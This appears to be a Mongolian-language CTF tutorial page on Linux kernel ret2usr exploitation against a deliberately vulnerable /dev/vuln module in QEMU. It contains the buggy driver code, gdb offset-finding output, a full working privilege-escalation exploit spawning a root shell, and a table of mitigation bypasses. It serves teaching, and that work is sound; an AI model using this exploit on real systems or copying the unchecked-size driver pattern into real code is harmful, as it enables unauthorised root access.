---
title: ret2usr
description: Эмзэг kernel драйверийн stack overflow-оор return address-ийг userland код руу чиглүүлж (ret2usr) эрхгүй хэрэглэгчээс root болох.
---

Userland pwn нь нэг **процессыг** эвддэг бол **kernel pwn** нь үйлдлийн системийн цөмийг (**kernel**) эвдэж
**бүх системийн эрх (root)** авна. Энэ бол kernel-ийн анхны техник — **ret2usr** (return-to-user): kernel-ийн
stack overflow-оор return address-ийг **userland дахь өөрсдийн код** руу чиглүүлж, kernel эрхээр (ring 0) ажиллуулна.

[ret2text](../../userland/ret2text/)-тэй төстэй санаа — буцах хаягийг хянаж, сонгосон код руу үсрэх — гэхдээ энэ удаа
**kernel дотор** бөгөөд зорилго нь root болох.

:::note[Юуны өмнө]
- Userland pwn: [ret2text](../../userland/ret2text/) (stack overflow, return address), [calling convention](../../basics/calling-convention/)
- Kernel pwn нь **QEMU виртуал машин** дотор ажиллана (socat сервер биш).
:::

## Kernel pwn-ийн орчин

| Хэсэг | Тайлбар |
|-------|---------|
| `bzImage` | Компил хийсэн Linux kernel (Linux 6.6.58) |
| `rootfs.cpio.gz` | initramfs — BusyBox file system (эмзэг модуль, flag агуулна) |
| `vuln.ko` | **Эмзэг kernel модуль**, `/dev/vuln` төхөөрөмж үүсгэнэ |
| `run.sh` | QEMU-г эдгээрээр ачаалах скрипт |

Зорилго: QEMU дотор **эрхгүй хэрэглэгч (uid 1000)**-ээр эхэлж, kernel-ийн алдааг ашиглан **root (uid 0)** болж
`/root/flag.txt`-ийг унших.

:::caution[Intro — хамгаалалт унтраалттай]
Энэ анхны бодлогод kernel-ийн хамгаалалтууд (**KASLR, SMEP, SMAP, KPTI, stack canary**) унтраалттай. Тус бүр нь
юу хийдэг, хэрхэн тойрдгийг доорх [Хамгаалалт](#хамгаалалт) хэсэгт үзнэ.
:::

## Бодлого

Бүх файл [`challenges/pwn/kernel/ret2usr`](https://github.com/computer-communication-security-club/ctf-wiki/tree/main/challenges/pwn/kernel/ret2usr) хавтсанд байна:

| Файл | Тайлбар |
|------|---------|
| [`vuln.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/kernel/ret2usr/vuln.c) | Эмзэг модулийн эх код |
| [`bzImage`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/kernel/ret2usr/bzImage) | Бэлэн kernel |
| [`rootfs.cpio.gz`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/kernel/ret2usr/rootfs.cpio.gz) | initramfs (BusyBox + `vuln.ko` + flag) |
| [`run.sh`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/kernel/ret2usr/run.sh) | QEMU ачаалах (local) |
| [`Dockerfile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/kernel/ret2usr/Dockerfile), [`start.sh`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/kernel/ret2usr/start.sh) | Сервер (remote) — холбогдоход VM shell өгнө |

Ажиллуулах (`qemu-system-x86_64` хэрэгтэй):

```console
$ cd challenges/pwn/kernel/ret2usr
$ ./run.sh                 # эрхгүй (uid 1000) shell руу буулгана
[ boot complete; /dev/vuln ready; эрхгүй хэрэглэгч (uid 1000) ]
/ $ id
uid=1000 gid=1000
/ $ cat /root/flag.txt
cat: can't open '/root/flag.txt': Permission denied
```

Exploit-ээ VM-д оруулахын тулд `run.sh`-д дамжуулна (rootfs-д `/exploit` болгон нэмж **автоматаар ажиллуулна**):

```console
$ gcc -static -o exploit exploit.c
$ ./run.sh exploit
```

**Сервер (remote) хувилбар.** Challenge-ийг Docker image хэлбэрээр ажиллуулж болно. Холбогдоход шууд
эрхгүй (uid 1000) **бүрэн shell** өгнө (хугацааны хязгааргүй). `/tmp` бичигдэх тул static exploit-ээ
base64-ээр оруулж ажиллуулна:

```console
$ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-ret2usr
$ nc localhost 1337
/ $ base64 -d > /tmp/e << "END"       # өөр дээрээ: gcc -static -o exploit exploit.c && base64 -w0 exploit
<exploit-ийн base64>
END
/ $ chmod +x /tmp/e; /tmp/e
```

:::tip[gdb-ээр debug хийх]
`run.sh`-ийн qemu мөрөнд `-s` нэмбэл QEMU `localhost:1234` дээр gdb server нээнэ. `target remote :1234`-ээр холбогдоно.
Серверт KVM шаардлагагүй — QEMU нь TCG (software) горимд ажиллана.
:::

:::caution[Spoiler]
Доорх хэсэгт бодолт байгаа. Эхлээд өөрөө оролдоод үзээрэй!
:::

## Шийдэл

### 1. Эмзэг драйвер

`/dev/vuln` нь `ioctl`-оор stack буферт өгөгдөл хадгалах (`CMD_STORE`) / унших (`CMD_FETCH`) боломжтой. Хэрэглэгч
`struct req { size, data }` дамжуулна. Асуудал: `size`-ийг **шалгадаггүй**:

```c title="vuln.c"
struct req {
    unsigned long size;   // хэрэглэгчийн өгөх хэмжээ (шалгагддаггүй!)
    char *data;
};

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    char buf[BUF_SIZE];                   // BUF_SIZE = 0x100, stack buffer
    char *p = buf;
    struct req r;

    __asm__ volatile("" : "+r"(p));       // буферийн хэмжээг компиляторт нуух (FORTIFY)
    if (copy_from_user(&r, (void __user *)arg, sizeof(r)))
        return -EFAULT;

    switch (cmd) {
    case CMD_STORE:
        if (copy_from_user(p, r.data, r.size))   // size шалгахгүй: STACK OVERFLOW
            return -EFAULT;
        break;
    case CMD_FETCH:
        if (copy_to_user(r.data, p, r.size))      // size шалгахгүй: stack leak
            return -EFAULT;
        break;
    }
    return 0;
}
```

`CMD_STORE` нь `r.size` байтыг 0x100 байтын stack буфер `buf` руу хуулна — **хэмжээ шалгахгүй** тул kernel stack overflow.

### 2. Offset олох

`vuln_ioctl`-ийг **gdb-ээр** харна. Kernel модулийг debug хийхэд QEMU-г `-s`-тэй ачаалж (gdbstub `:1234`),
VM дотроос модулийн `.text` хаягийг аваад host дээрээс холбогдоно:

```console
/ $ cat /sys/module/vuln/sections/.text      # VM дотор — модулийн ачаалагдсан хаяг
0xffffffffa0000000
```

```ansi
[1;31mpwndbg>[0m file vmlinux
[1;31mpwndbg>[0m target remote :1234
[1;31mpwndbg>[0m add-symbol-file vuln.ko 0xffffffffa0000000
[1;31mpwndbg>[0m disassemble vuln_ioctl
Dump of assembler code for function vuln_ioctl:
   [34m0xffffffffa0000010[0m <+0>:	[32mendbr64[0m
   [34m0xffffffffa0000014[0m <+4>:	[32mpush   [0m[31mrbp[0m
   [34m0xffffffffa0000015[0m <+5>:	[32mxor    [0m[31meax[0m,[31meax[0m
   [34m0xffffffffa0000017[0m <+7>:	[32mmov    [0m[31mecx[0m,[34m0x20[0m
   [34m0xffffffffa000001c[0m <+12>:	[32mmov    [0m[31mebp[0m,[31mesi[0m
   [34m0xffffffffa000001e[0m <+14>:	[32mpush   [0m[31mrbx[0m
   [34m0xffffffffa000001f[0m <+15>:	[32mmov    [0m[31mrsi[0m,[31mrdx[0m
   [34m0xffffffffa0000022[0m <+18>:	[32msub    [0m[31mrsp[0m,[34m0x110[0m
   [34m0xffffffffa0000029[0m <+25>:	[32mlea    [0m[31mrbx[0m,[[31mrsp[0m[34m+[0m[34m0x10[0m]
   [34m0xffffffffa000002e[0m <+30>:	[32mmov    [0mQWORD PTR [[31mrsp[0m],[34m0x0[0m
   [34m0xffffffffa0000036[0m <+38>:	[32mmov    [0mQWORD PTR [[31mrsp[0m[34m+[0m[34m0x8[0m],[34m0x0[0m
   [34m0xffffffffa000003f[0m <+47>:	[32mmov    [0m[31mrdi[0m,[31mrbx[0m
   [34m0xffffffffa0000042[0m <+50>:	[32mrep    [0mstos QWORD PTR [[31mrdi[0m],[31mrax[0m
   [34m0xffffffffa0000045[0m <+53>:	[32mmov    [0m[31medx[0m,[34m0x10[0m
   [34m0xffffffffa000004a[0m <+58>:	[32mmov    [0m[31mrdi[0m,[31mrsp[0m
   [34m0xffffffffa000004d[0m <+61>:	[32mcall   [0m[34m0xffffffff8151f6a0[0m <[33m_copy_from_user[0m>
   [34m0xffffffffa0000052[0m <+66>:	[32mtest   [0m[31mrax[0m,[31mrax[0m
   [34m0xffffffffa0000055[0m <+69>:	[32mjne    [0m[34m0xffffffffa00000c2[0m <[33mvuln_ioctl+178[0m>
   [34m0xffffffffa0000057[0m <+71>:	[32mcmp    [0m[31mebp[0m,[34m0x40106b01[0m
   [34m0xffffffffa000005d[0m <+77>:	[32mje     [0m[34m0xffffffffa000009d[0m <[33mvuln_ioctl+141[0m>
   [34m0xffffffffa000005f[0m <+79>:	[32mmov    [0m[31mrax[0m,[34m0xffffffffffffffea[0m
   [34m0xffffffffa0000066[0m <+86>:	[32mcmp    [0m[31mebp[0m,[34m0x80106b02[0m
   [34m0xffffffffa000006c[0m <+92>:	[32mjne    [0m[34m0xffffffffa000008f[0m <[33mvuln_ioctl+127[0m>
   [34m0xffffffffa000006e[0m <+94>:	[32mmov    [0m[31mrdx[0m,QWORD PTR [[31mrsp[0m]
   [34m0xffffffffa0000072[0m <+98>:	[32mmov    [0m[31mrdi[0m,QWORD PTR [[31mrsp[0m[34m+[0m[34m0x8[0m]
   [34m0xffffffffa0000077[0m <+103>:	[32mcmp    [0m[31mrdx[0m,[34m0x7fffffff[0m
   [34m0xffffffffa000007e[0m <+110>:	[32mja     [0m[34m0xffffffffa00000c0[0m <[33mvuln_ioctl+176[0m>
   [34m0xffffffffa0000080[0m <+112>:	[32mmov    [0m[31mrsi[0m,[31mrbx[0m
   [34m0xffffffffa0000083[0m <+115>:	[32mcall   [0m[34m0xffffffff8151f720[0m <[33m_copy_to_user[0m>
   [34m0xffffffffa0000088[0m <+120>:	[32mtest   [0m[31mrax[0m,[31mrax[0m
   [34m0xffffffffa000008b[0m <+123>:	[32mjne    [0m[34m0xffffffffa00000c2[0m <[33mvuln_ioctl+178[0m>
   [34m0xffffffffa000008d[0m <+125>:	[32mxor    [0m[31meax[0m,[31meax[0m
   [34m0xffffffffa000008f[0m <+127>:	[32madd    [0m[31mrsp[0m,[34m0x110[0m
   [34m0xffffffffa0000096[0m <+134>:	[32mpop    [0m[31mrbx[0m
   [34m0xffffffffa0000097[0m <+135>:	[32mpop    [0m[31mrbp[0m
   [34m0xffffffffa0000098[0m <+136>:	[32mret[0m
   [34m0xffffffffa0000099[0m <+137>:	[32mint3[0m
   [34m0xffffffffa000009a[0m <+138>:	[32mint3[0m
   [34m0xffffffffa000009b[0m <+139>:	[32mint3[0m
   [34m0xffffffffa000009c[0m <+140>:	[32mint3[0m
   [34m0xffffffffa000009d[0m <+141>:	[32mmov    [0m[31mrdx[0m,QWORD PTR [[31mrsp[0m]
   [34m0xffffffffa00000a1[0m <+145>:	[32mmov    [0m[31mrsi[0m,QWORD PTR [[31mrsp[0m[34m+[0m[34m0x8[0m]
   [34m0xffffffffa00000a6[0m <+150>:	[32mcmp    [0m[31mrdx[0m,[34m0x7fffffff[0m
   [34m0xffffffffa00000ad[0m <+157>:	[32mja     [0m[34m0xffffffffa00000c0[0m <[33mvuln_ioctl+176[0m>
   [34m0xffffffffa00000af[0m <+159>:	[32mmov    [0m[31mrdi[0m,[31mrbx[0m
   [34m0xffffffffa00000b2[0m <+162>:	[32mcall   [0m[34m0xffffffff8151f6a0[0m <[33m_copy_from_user[0m>
   [34m0xffffffffa00000b7[0m <+167>:	[32mtest   [0m[31mrax[0m,[31mrax[0m
   [34m0xffffffffa00000ba[0m <+170>:	[32mjne    [0m[34m0xffffffffa00000c2[0m <[33mvuln_ioctl+178[0m>
   [34m0xffffffffa00000bc[0m <+172>:	[32mxor    [0m[31meax[0m,[31meax[0m
   [34m0xffffffffa00000be[0m <+174>:	[32mjmp    [0m[34m0xffffffffa000008f[0m <[33mvuln_ioctl+127[0m>
   [34m0xffffffffa00000c0[0m <+176>:	[32mud2[0m
   [34m0xffffffffa00000c2[0m <+178>:	[32mmov    [0m[31mrax[0m,[34m0xfffffffffffffff2[0m
   [34m0xffffffffa00000c9[0m <+185>:	[32mjmp    [0m[34m0xffffffffa000008f[0m <[33mvuln_ioctl+127[0m>
End of assembler dump.
```

Stack frame: `[rsp, rsp+0x10)` = `r` (16 байт), `[rsp+0x10, rsp+0x110)` = `buf` (0x100). `push rbp`, `push rbx`
хийгдсэн тул return address нь `rsp+0x120`-д байна:

```
offset = 0x120 − 0x10 = 0x110
```

`0x110` байт бичээд дараагийн 8 байт return address-ийг дарна. **Stack canary байхгүй.**

:::tip[gdb-ээр cyclic-оор олох]
Disassemble уншихын оронд [userland](../../userland/ret2text/#4-offset-олох)-тай яг адил **cyclic pattern**-ээр ч
offset-ийг олж болно. Pattern-ийг overflow-оор илгээхэд kernel `ret` хийх гэж буй утга нь pattern-ийн тодорхой
хэсэг болно. (Module-ийн `.text` нь read-only тул software breakpoint биш **hardware breakpoint** `hbreak` хэрэглэнэ.)

```ansi
[1;31mpwndbg>[0m cyclic 0x200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaj...   [90m# давтагдашгүй pattern[0m
[1;31mpwndbg>[0m hbreak *0xffffffffa0000098        [90m# vuln_ioctl-ийн ret (modtext+0x98)[0m
Hardware assisted breakpoint 1 at [34m0xffffffffa0000098[0m
[1;31mpwndbg>[0m continue
[90m# VM дотор уг pattern-ийг CMD_STORE ioctl-оор илгээнэ (overflow)[0m

Breakpoint 1, [34m0xffffffffa0000098[0m in [33mvuln_ioctl[0m ()
[1;31mpwndbg>[0m x/gx $rsp                         [90m# ret авах гэж буй утга[0m
[34m0xffffc900001a7f08[0m:	[34m0x6361617463616173[0m
[1;31mpwndbg>[0m cyclic -l 0x63616173
272
```

`cyclic -l 0x63616173` → **272** = `0x110` — disassemble-аас олсонтой яг ижил. (`0x6361617463616173`-ийн
доод 4 байт нь `0x63616173`.) Хэрэв kernel шууд `ret` хийгээд уначихвал **Oops** дахь `RIP:` утгыг мөн адил
`cyclic -l` хийж болно.
:::

### 3. ret2usr санаа

root болох хамгийн энгийн арга: kernel дотор `commit_creds(&init_cred)` дуудах. `init_cred` нь init процессын
**бүх эрхтэй (root)** credential. **SMEP унтраалттай** тул kernel (ring 0)-д **userland код** ажиллуулж болно —
энэ бол **ret2usr**:

1. `vuln_ioctl`-ийн return address-ийг бидний **userland `escalate()`** функц рүү дарж бичнэ.
2. `ret` хийхэд CPU `escalate()` руу **ring 0-д** үсэрнэ.
3. `escalate()` дотор `commit_creds(&init_cred)` дуудаж root болно.
4. `swapgs; iretq`-ээр цэвэрхэн userland руу буцаж (KPTI off) root shell нээнэ.

### 4. Kernel хаяг олох

KASLR унтраалттай тул хаяг тогтмол. `/proc/kallsyms`-аас:

```console
$ grep -E ' (commit_creds|init_cred)$' /proc/kallsyms
ffffffff810bcf80 T commit_creds
ffffffff82a52f80 D init_cred
```

:::note[prepare_kernel_cred(0) биш]
Хуучин сурах бичигт `commit_creds(prepare_kernel_cred(0))` гэдэг. Linux **6.2+** дээр `prepare_kernel_cred(NULL)`
нь өөр болсон (WARN өгөөд NULL буцаана) тул `commit_creds(&init_cred)`-ийг шууд ашиглав.
:::

### 5. Exploit

```c title="exploit.c" ins={44-56,62-68}
// /dev/vuln — kernel stack overflow (ioctl) -> ret2usr privilege escalation.
// KASLR/SMEP/SMAP/KPTI унтраалттай (intro). commit_creds, init_cred-ийн хаягийг
// /proc/kallsyms эсвэл System.map-аас (KASLR off тул тогтмол) авна.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define COMMIT_CREDS 0xffffffff810bcf80
#define INIT_CRED    0xffffffff82a52f80   // &init_cred (root cred)
#define OFFSET       0x110                // buf-оос return address хүртэл

struct req { unsigned long size; char *data; };
#define CMD_STORE _IOW('k', 1, struct req)   // = 0x40106b01

typedef void (*commit_creds_t)(uint64_t);
uint64_t user_cs, user_ss, user_rsp, user_rflags;

static void save_state(void) {
    __asm__ __volatile__(
        "movq %%cs,  %0\n"
        "movq %%ss,  %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n\t popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) { puts("[+] root авлаа!"); system("/bin/sh"); }
    else printf("[-] амжилтгүй, uid=%d\n", getuid());
    exit(0);
}

// Return address энэ функц рүү үсэрнэ (ring-0, SMEP off).
// commit_creds(&init_cred) -оор root болоод swapgs; iretq -ээр userland руу буцна.
static void escalate(void) {
    ((commit_creds_t)COMMIT_CREDS)(INIT_CRED);
    user_rsp = (user_rsp & ~0xfUL) - 8;        // userland stack-ийг тэгшлэх (movaps)
    __asm__ __volatile__(
        "swapgs\n\t"
        "movq %0, %%r15\n\t pushq %%r15\n\t"   // SS
        "movq %1, %%r15\n\t pushq %%r15\n\t"   // RSP
        "movq %2, %%r15\n\t pushq %%r15\n\t"   // RFLAGS
        "movq %3, %%r15\n\t pushq %%r15\n\t"   // CS
        "movq %4, %%r15\n\t pushq %%r15\n\t"   // RIP -> win
        "iretq\n\t"
        :: "m"(user_ss), "m"(user_rsp), "m"(user_rflags), "m"(user_cs), "r"((uint64_t)win)
        : "r15", "memory");
}

int main(void) {
    save_state();

    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    char payload[OFFSET + 8];
    memset(payload, 'A', OFFSET);
    *(uint64_t *)(payload + OFFSET) = (uint64_t)escalate;   // return address -> escalate

    struct req r = { .size = sizeof(payload), .data = payload };
    puts("[*] overflow илгээж байна (CMD_STORE)...");
    ioctl(fd, CMD_STORE, &r);                 // kernel stack overflow

    puts("[-] энд хүрвэл амжилтгүй");
    return 0;
}
```

Гол хэсгүүд:

- `save_state()` — overflow-оос **өмнө** userland-ийн `cs, ss, rsp, rflags`-ийг хадгална (`iretq` эдгээрээр буцна).
- `escalate()` — return address энд үсэрнэ. `commit_creds(&init_cred)`-оор root болоод, stack-ийг 16 байтад
  тэгшилж (`movaps`), `swapgs; iretq`-ээр `win()` руу буцна.
- `main()` — `buf`-ийг `0x110` байт `A`-аар дүүргээд дараагийн 8 байтад `escalate`-ийн хаягийг тавьж
  `CMD_STORE` ioctl-ээр илгээнэ.

### 6. Ажиллуулах

```console
$ gcc -static -o exploit exploit.c
$ ./run.sh exploit
...
[ /dev/vuln ready; эрхгүй хэрэглэгч (uid 1000) ]
[*] overflow илгээж байна (CMD_STORE)...
[+] root авлаа!
/ # id
uid=0 gid=0
/ # cat /root/flag.txt
FLAG{ret2usr_kernel_pr1v_esc}
```

Эрхгүй хэрэглэгчээс kernel-ийн алдаагаар **root** боллоо.

## Хамгаалалт

Энэ intro-д унтраасан хамгаалалтууд болон тэдгээрийг тойрох аргууд:

| Хамгаалалт | Юу хийдэг | Тойрох арга |
|------------|-----------|-------------|
| **KASLR** | Kernel-ийн base хаягийг санамсаргүй болгоно | Kernel хаяг **leak** хийх (`CMD_FETCH`-оор stack-аас) → base тооцох |
| **SMEP** | Ring 0-д **userland код** ажиллуулахыг хориглоно | ret2usr боломжгүй → **kernel ROP** (цөм доторх gadget) |
| **SMAP** | Ring 0-д **userland өгөгдөл** хандахыг хориглоно | ROP chain-ийг kernel санах ойд байрлуулах |
| **KPTI** | Kernel/user page table тусгаарлана | Буцахад тусгай **trampoline** (`swapgs_restore_regs_and_return_to_usermode`) |
| **Stack canary** | Overflow-ийг `ret`-ээс өмнө барина | Canary-г **leak** хийх (`CMD_FETCH`) |

`CMD_FETCH` (хэмжээ шалгахгүй унших) нь эдгээр leak-үүдийг хийх боломжийг олгодог — дараагийн бодлогуудад ашиглана.

## Эх сурвалж

- [Phrack #64 — Attacking the Core: Kernel Exploitation Notes](https://phrack.org/issues/64/6) (twiz & sgrakkyu)
- [Linux kernel — `cred` ба `commit_creds`](https://www.kernel.org/doc/html/latest/security/credentials.html)
- Нэмэлт дасгал: [pawnyable.cafe — Linux Kernel](https://pawnyable.cafe/linux-kernel/)
